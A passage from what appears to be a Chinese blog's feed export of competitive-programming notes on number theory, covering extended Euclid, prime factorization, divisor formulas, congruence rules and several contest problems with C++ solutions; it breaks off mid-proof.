<p>输入只包括一行5个整数x，y，m，n，L，其中x≠y &lt; 2000000000，0 &lt; m、n &lt; 2000000000，0 &lt; L &lt; 2100000000。</p>
</blockquote>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>在单独一行里输出碰面所需要的跳跃次数，如果永远不可能碰面则输出一行“Impossible”。</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><ul>
<li>这个一看就是扩展欧几里德啊……我们可以这样变幻一下。</li>
<li>首先，我们可以轻松的设出来方程：设x为两只青蛙需要跳的次数，a为A青蛙的初始位置，b为B青蛙的初始位置，然后解方程：</li>
</ul>
<ol>
<li>(n*x+a)%L=(m*x+b)%L</li>
<li>nx%L+a%L=mx%L+b%L</li>
<li>nx%L-mx%L=b%L-a%L</li>
<li>(n-m)x%L=(b-a)%L</li>
<li>设c=(b-a)%L,d=n-m，则c,d为可计算常数；</li>
<li>dx%L=c</li>
<li>dx+Ly=c</li>
</ol>
<ul>
<li><p>这个式子里面的x就是要输出的k！！！<br>数论超级有意思的！</p>
</li>
<li><p>然后就是在开始扩展欧几里德之前先判断一下是否有解，就是if(c%GCD)是否为零，如果是则有解，否则无解。也就是判断一下c是不是x和y的最大公约数的倍数。</p>
</li>
<li><p>最后输出的时候用上面的方法找出来要求的最小正整数解就行了！</p>
</li>
</ul>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> s1,s2,m,n,l,a,b,c,This,All,x,y;</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">GCD</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> x,<span class="keyword">long</span> <span class="keyword">long</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> Now=x%y;</span><br><span class="line">    <span class="keyword">while</span>(Now)</span><br><span class="line">    &#123;</span><br><span class="line">        x=y;</span><br><span class="line">        y=Now;</span><br><span class="line">        Now=x%y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EXGCD</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> a,<span class="keyword">long</span> <span class="keyword">long</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!b)&#123;x=c/This;y=<span class="number">0</span>;<span class="keyword">return</span>;&#125;</span><br><span class="line">    EXGCD(b,a%b);</span><br><span class="line">    All=x; x=y; y=All-a/b*y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">LCM</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> x,<span class="keyword">long</span> <span class="keyword">long</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">return</span> <span class="built_in">abs</span>(x*y/This/a); &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;s1&gt;&gt;s2&gt;&gt;m&gt;&gt;n&gt;&gt;l;</span><br><span class="line">    a=m-n; b=l; c=s2-s1;</span><br><span class="line">    This=GCD(a,b);</span><br><span class="line">    <span class="keyword">if</span>(c%This) <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Impossible&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        EXGCD(a,b);</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;(x%LCM(a,b)+LCM(a,b))%LCM(a,b)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>EXGCD</tag>
      </tags>
  </entry>
  <entry>
    <title>分解质因数</title>
    <url>/2017/10/10/f58ea20e0523/</url>
    <content><![CDATA[<h1 id="分解质因数"><a href="#分解质因数" class="headerlink" title="分解质因数"></a>分解质因数</h1><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><blockquote>
<p>分解质因数就是把一个数，用自己所有的质因数的ai次方的乘积表示出来，而且这种表示方式是唯一的，格式如下：</p>
</blockquote>
<p>$ n={a_{1}}^{b1} * {a_{2}}^{b2} * {a_{3}}^{b3} * cdots * {a_{i}}^{bi} $</p>
<p>其中，a都为质数，切为递增。</p>
<p>分解的方法为依次枚举因数ai，然后看n%ai是否可以为0，若可以，则为其中的一个质因数，然后不停地n/=ai，直到n%ai不为零，n/=ai的次数也就是bi的数。因为每次的n/=ai把非质数都给筛掉了，所以不需要担心ai不为质数。</p>
<p>一定要记得从2开始枚举，枚举到n的开方就行。如果发现质因数为0，则n=n^1;</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Now=n;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=<span class="built_in">sqrt</span>(<span class="keyword">double</span>(n))+<span class="number">1</span>;i++)</span><br><span class="line"><span class="keyword">if</span>(!(Now%i))</span><br><span class="line">&#123;</span><br><span class="line">    First[++all].Prime=i;</span><br><span class="line">    <span class="keyword">while</span>(!(Now%i))</span><br><span class="line">    &#123;</span><br><span class="line">        Now/=i;</span><br><span class="line">        First[all].Number++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="一些结论"><a href="#一些结论" class="headerlink" title="一些结论"></a>一些结论</h1><h2 id="关于约数和因数的区别"><a href="#关于约数和因数的区别" class="headerlink" title="关于约数和因数的区别"></a>关于约数和因数的区别</h2><p>约数和因数既有联系,又有区别,这主要表现在以下三个方面.</p>
<ol>
<li>约数必须在整除的前提下才存在,而因数是从乘积的角度来提出的.如果数a与数b相乘的积是数c,a与b都是c的因数.</li>
<li>约数只能对在整数范围内而言,而因数就不限于整数的范围.<br>例如：6×8＝48.既可以说6和8都是48的因数,也可以说6和8都是48的约数.<br>又如：0.9×8＝7.2.虽然可以说0.9和8都是7.2的因数,却不能说0.9和8是7.2的约数.<br>从这一点来看,一个数的因数有可能大于它本身,而约数不能大于这个数的本身.</li>
<li>对于一个整数,凡能整除它的数,都是这个整数的约数.<br>例如：1、2、4、8、16都能整除16,因此,1、2、4、8、16也都是16的约数.而当一个数被分解成两个或几个数相乘时,因数的个数就受到了限定.<br>又如：2×8＝16.只能说2和8是16的因数,而不能说1、2、4、8、16都是的因数,因为1×2×4×8×16的结果,并不等于16.</li>
</ol>
<h2 id="因数个数"><a href="#因数个数" class="headerlink" title="因数个数"></a>因数个数</h2><blockquote>
<p>对于分解质因数:</p>
</blockquote>
<p>$n = {a_{1}}^{b1} * {a_{2}}^{b2} * {a_{3}}^{b3} * \cdots * {a_{i}}^{bi}$</p>
<blockquote>
<p>n的所有因数的个数为:</p>
</blockquote>
<p>$all=(b1+1)* (b2+1)* (b3+1)* (bn+1)$</p>
<h2 id="正约数之和"><a href="#正约数之和" class="headerlink" title="正约数之和"></a>正约数之和</h2><blockquote>
<p>对于分解质因数:</p>
</blockquote>
<p>$n={a_{1}}^{b1}* {a_{2}}^{b2} *{a_{3}}^{b3} *\cdots * {a_{i}}^{bi}$</p>
<blockquote>
<p>n的正约数之和为:</p>
</blockquote>
<p>$all=(1+{a_{1}}^{1} +{a_{1}}^{2} +\cdots +{a_{1}}^{b1}) *(1+{a_{2}}^{1}+ {a_{2}}^{2}+ \cdots+ {a_{2}}^{b2}) *\cdots\cdots * (1+{a_{i}}^{1}+ {a_{i}}^{2}+ \cdots +{a_{i}}^{bi})$</p>
<h2 id="n-分解质因数后因子n的个数"><a href="#n-分解质因数后因子n的个数" class="headerlink" title="n!分解质因数后因子n的个数"></a>n!分解质因数后因子n的个数</h2><p>证明过程：<br>这个网上一搜一大把，我只把核心的东西写出来：</p>
<ul>
<li>m!=1*2*3*……*(m-2)*(m-1)*m</li>
<li>m!=(n*2n*3n*……*kn)*ohter</li>
<li>m!=n^k*(1*2*……*k)*other</li>
<li>m!=n^k*k!*other</li>
</ul>
<p>因为kn&lt;=m 而k肯定是最大值所以k=m/n;<br>从这个表达式中可以提取出k个n;<br>然后按照相同的方法循环下去可以求出k!中因子n的个数。</p>
<p>比如我们举个例子吧：</p>
<p>9的阶乘：1*2*3*4*5*6*7*8*9，求因子2的个数：</p>
<p>!9=1*(2)*3*(2*2)*5*6*7*(2*2*2*2)*9</p>
<p>然后求出k=8/2=4，m=9/2=4 所以就已经有了4个2。<br>然后求出k=4/2=2，m=4/2=2 所以就已经有了6个2。<br>然后求出k=2/2=1，m=2/2=1 所以就已经有了7个2。<br>然后求出k=1/2=0，m=1/2=0 m=0结束循环，一共用7个2。</p>
<p>代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetNumber</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Sum=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">while</span>(m)</span><br><span class="line">    &#123;</span><br><span class="line">        Sum+=m/n;</span><br><span class="line">        m=m/n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;Sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="NOIP2009-细胞问题"><a href="#NOIP2009-细胞问题" class="headerlink" title="NOIP2009 细胞问题"></a>NOIP2009 细胞问题</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><ul>
<li>Hanks 博士是 BT (Bio-Tech，生物技术) 领域的知名专家。现在，他正在为一个细胞实 验做准备工作：培养细胞样本。</li>
<li>Hanks 博士手里现在有 N 种细胞，编号从 1~N，一个第 i 种细胞经过 1 秒钟可以分裂为Si 个同种细胞（Si 为正整数）。</li>
<li>现在他需要选取某种细胞的一个放进培养皿，让其自由分裂，进行培养。一段时间以后，再把培养皿中的所有细胞平均分入 M 个试管，形成 M 份样本，用于实验。</li>
<li>M 总可以表示为 m1 的 m2 次方，即 M = m1^m2  ，其中 m1，m2均为基本数据类型可以存储的正整数。注意，整个实验过程中不允许分割单个细胞，比如某个时刻若培养皿中有4个细胞，</li>
<li>Hanks 博士可以把它们分入 2 个试管，每试管内 2 个，然后开始实验。但如果培养皿中有 5 个细胞，博士就无法将它们均分入 2 个试管。此时，博士就只能等待一段时间，让细胞们继 续分裂，使得其个数可以均分，或是干脆改换另一种细胞培养。</li>
<li>为了能让实验尽早开始，Hanks 博士在选定一种细胞开始培养后，总是在得到的细胞“刚 好可以平均分入 M个试管”时停止细胞培养并开始实验。现在博士希望知道，选择哪种细 胞培养，可以使得实验的开始时间最早。</li>
</ul>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><ol>
<li>第一行有一个正整数 N，代表细胞种数。</li>
<li>第二行有两个正整数 m1，m2，以一个空格隔开， m1^m2  即表示试管的总数 M。</li>
<li>第三行有 N 个正整数，第 i 个数 Si 表示第 i 种细胞经过 1 秒钟可以分裂成同种细胞的个 数。</li>
</ol>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>共一行，为一个整数，表示从开始培养细胞到实验能够开始所经过的 最少时间（单位为秒）。无解输出-1.</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><blockquote>
<p>这道题也是非常<del>简单</del>呢。</p>
</blockquote>
<p>首先你需要明白，m1^m2是非常大的，但是你要怎么办呢？我们只需要对m1进行质因数分解就行了，然后数量就是m1质因子的数量*m2就行，因为m1经过m2次方之后，质因子是不变的，变得是数量，也就是:</p>
<p>$n^m = ({a_{1}}^{b1} * {a_{2}}^{b2} * {a_{3}}^{b3} *  \cdots * {a_{i}}^{bi}) ^m $</p>
<p>$n^m = {a_{1}}^{b1m} * {a_{2}} ^ {b2m} * {a_{3}} ^ {b3m} * \cdots * {a_{i}} ^ {bim} $</p>
<p>所以也是避免了高精度的计算……</p>
<p>然后我们对于其他每个细胞的分裂数量都进行质因数分解，然后比对，如果m1有的细胞没有，那么这个细胞永远没有办法满足条件。如果所有的质因数都有的话，那么分裂需要的时间就是所有质因数的数量，也就是m1^m2的bi的数量除以细胞分裂数的质因数的数量bi，向上取整后的最大值。这个最大值就是细胞需要分裂的时间，然后找到所有细胞分裂时间中最小的输出就行了。</p>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Prime_number</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> Prime;</span><br><span class="line">    <span class="keyword">int</span> Number;</span><br><span class="line">&#125;First[<span class="number">20000</span>];</span><br><span class="line"><span class="keyword">int</span> n,m1,m2,a[<span class="number">20000</span>],Maxx,ans=<span class="number">2123456789</span>;</span><br><span class="line"><span class="keyword">int</span> Second[<span class="number">40000</span>],all,Top,Now;</span><br><span class="line"><span class="keyword">bool</span> Flag=<span class="literal">false</span>;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">Read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> F=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">int</span> This=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">char</span> ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>) F=<span class="number">-1</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        This=(This&lt;&lt;<span class="number">1</span>)+(This&lt;&lt;<span class="number">3</span>)+ch-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> This\*F;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    n=Read(); m1=Read(); m2=Read(); Now=m1;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) a[i]=Read();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=<span class="built_in">sqrt</span>(<span class="keyword">double</span>(m1))+<span class="number">1</span>;i++)</span><br><span class="line">    <span class="keyword">if</span>(!(Now%i))</span><br><span class="line">    &#123;</span><br><span class="line">        First[++all].Prime=i;</span><br><span class="line">        <span class="keyword">while</span>(!(Now%i))</span><br><span class="line">        &#123;</span><br><span class="line">            Now/=i;</span><br><span class="line">            First[all].Number++;</span><br><span class="line">        &#125;</span><br><span class="line">        First[all].Number\*=m2;</span><br><span class="line">        Top=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!all&amp;&amp;m1!=<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        First[++all].Prime=m1;</span><br><span class="line">        First[all].Number=m2;</span><br><span class="line">        Top=m1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Now=a[i]; Flag=<span class="literal">false</span>; Maxx=<span class="literal">false</span>;</span><br><span class="line">        <span class="built_in">memset</span>(Second,<span class="literal">false</span>,<span class="keyword">sizeof</span>(Second));</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">2</span>;j&lt;=min(<span class="keyword">int</span>(<span class="built_in">sqrt</span>(<span class="keyword">double</span>(a[i]))+<span class="number">1</span>),Top);j++)</span><br><span class="line">        <span class="keyword">while</span>(!(Now%j))</span><br><span class="line">        &#123;</span><br><span class="line">            Now/=j;</span><br><span class="line">            Second[j]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=all;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!Second[First[j].Prime])</span><br><span class="line">            &#123;</span><br><span class="line">                Flag=<span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(First[j].Number%Second[First[j].Prime])</span><br><span class="line">                Maxx=max(Maxx,First[j].Number/Second[First[j].Prime]+<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">else</span> Maxx=max(Maxx,First[j].Number/Second[First[j].Prime]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!Flag) ans=min(Maxx,ans);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(ans==<span class="number">2123456789</span>) <span class="built_in">cout</span>&lt;&lt;<span class="number">-1</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="数学游戏"><a href="#数学游戏" class="headerlink" title="数学游戏"></a>数学游戏</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述:"></a>题目描述:</h2><ul>
<li><p>小x最近迷上了一款数学游戏，游戏的规则是这样的：给定一个整数N，从1..N这N个整数中，任意选取若干个整数，使得选取的数的乘积是一个完全平方数。(一个数如果是另一个整数的完全平方，那么我们就称这个数为完全平方数，也叫做平方数。例如：1,4,9,16,25,36,49,64,81,100,121,144,169,196,225,256,289,324,361,400,441,484,529…)</p>
</li>
<li><p>完全平方数的选取有很多种，现在我们只在乎这个完全平方数的最大值。这个最大值会很大，为了避免高精度，我们只需要知道最大值对1000000007去余数的值。</p>
</li>
</ul>
<h2 id="输入：-1"><a href="#输入：-1" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>一个正整数N</p>
</blockquote>
<h2 id="输出：-1"><a href="#输出：-1" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>一个正整数，最大得分对1000000007的模值。</p>
</blockquote>
<h2 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h2><p>这道题其实就是上面的对于!m的因数n的个数。首先我们明白，对于一个平方来说，其实就是找到所有质因子的偶数数量的乘积，因为对于一个数 x=n*n*n*m*m，来说，选择其中的一些来构成一个平方数的话，一定是选择每一个质因数的偶数个，比如n*n*m*m，这样的话就可以化成平方的形式:(n*n)*(n*m)，也就是n*m的二次方。</p>
<p>这样，我们就只需要把m以内的所有质数求出来，然后来求出!n的质因数的个数，然后取最大的偶数值，利用快速幂乘起来就行了。</p>
<h2 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Mod 1000000007</span></span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> n,m,Prime[<span class="number">2000000</span>],This;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> Total,Num,ans,Now;</span><br><span class="line"><span class="keyword">bool</span> vis[<span class="number">4000000</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetNumber</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Now=n;</span><br><span class="line">    Num=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">while</span>(Now)</span><br><span class="line">    &#123;</span><br><span class="line">        Num+=Now/x;</span><br><span class="line">        Now=Now/x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Fast_Power</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    This=x;</span><br><span class="line">    <span class="keyword">while</span>(Num)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(Num&amp;<span class="literal">true</span>) ans=ans\*This%Mod;</span><br><span class="line">        Num&gt;&gt;=<span class="literal">true</span>;</span><br><span class="line">        This=This\*This%Mod;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    ans=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!vis[i]) Prime[++Total]=i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;=n;j+=i) vis[j]=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=Total;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        GetNumber(Prime[i]);</span><br><span class="line">        <span class="keyword">if</span>(Num&amp;<span class="literal">true</span>) Num--;</span><br><span class="line">        Fast_Power(Prime[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>数论</tag>
      </tags>
  </entry>
  <entry>
    <title>互质和同余</title>
    <url>/2017/10/09/5af1c0f75ced/</url>
    <content><![CDATA[<h1 id="互质定理"><a href="#互质定理" class="headerlink" title="互质定理"></a>互质定理</h1><ol>
<li>GCD(a,b)=GCD(a,b-a*c)=GCD(a-b*c,b);</li>
<li>一定存在整数x、y，使得a*x+b*y=GCD(a,b);</li>
<li>m*GCD(a,b)=GCD(a*m,b*m);</li>
<li>若GCD(a,b)=d,GCD(a/d,b/d)=1;</li>
<li>m*LCM(a,b)=LCM(a*m,b*m);</li>
</ol>
<h1 id="同余定理"><a href="#同余定理" class="headerlink" title="同余定理"></a>同余定理</h1><blockquote>
<p>同余概念：对于两个数a、b,对m取余后相等，则称a和b同余。记作a≡b(mod m);  或者是对于两个数a、b,若m|(a-b) 则称a和b同余。</p>
</blockquote>
<ol>
<li>若a≡b(mod m),b≡c(mod m).则 a≡c(mod m);</li>
<li>若a≡b(mod m),c≡d(mod m).则 a±c≡b±d(mod m)，a*c≡b*d(mod m);</li>
<li>(a-b)%m=(a%m-b%m+m)%m;</li>
<li>若n|m,a≡b(mod m),则 a≡b(mod m);</li>
<li>若GCD(n,m)=1,a≡b(mod m),a≡b(mod n),则a≡b(mod n*m);</li>
<li>a≡b(mod m), n∈n*, 则 a^n≡b^n(mod m);</li>
<li>a*c≡b*c(mod m),GCD(c,m)=d,则a≡b(mod m/d);</li>
</ol>
<h1 id="高精度模运算"><a href="#高精度模运算" class="headerlink" title="高精度模运算"></a>高精度模运算</h1><blockquote>
<p>其实就是很简单的，从高位到低位枚举，加上当前数字mod k，然后结果乘十，不停地做就行了。</p>
</blockquote>
<p>代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,mod,ans;</span><br><span class="line"><span class="built_in">string</span> s1;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;s1&gt;&gt;mod;</span><br><span class="line">    n=s1.size()<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ans\*=<span class="number">10</span>;</span><br><span class="line">        ans+=s1[i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ans%=mod;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>放一道题来压压惊……</p>
</blockquote>
<h1 id="奶牛卧室"><a href="#奶牛卧室" class="headerlink" title="奶牛卧室"></a>奶牛卧室</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>奶牛们有一个习惯，那就是根据自己的编号选择床号。如果一头奶牛编号是a，并且有0..k-1一共k张床，那么她就会选择a  mod  k号床作为她睡觉的地点。显然，2头牛不能睡在一张床上。那么给出一些奶牛的编号，请你为她们准备一间卧室，使得里面的床的个数最少。</p>
</blockquote>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><ol>
<li>第一行是奶牛的个数n(1&lt;=n&lt;=5000)；</li>
<li>第2到第n+1行是每头奶牛的编号Si(1&lt;=Si&lt;=1000000)。</li>
</ol>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>仅一行，是最少的床的数目。</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p>这道题其实说白了就是对于任意一对编号(a,b)，使得a%k!=b%k.<br>如果枚举k的话，可能会比较大，复杂度就是O(n*n*k)那么会超时的。</p>
<p>但是我们可以有一个结论，就是当(a-b)%k!=0时，a%k!=b%k.</p>
<p>这样的话我们就可以小小的优化一下了（真的只是小小的优化一下！）</p>
<p>结论证明：</p>
<blockquote>
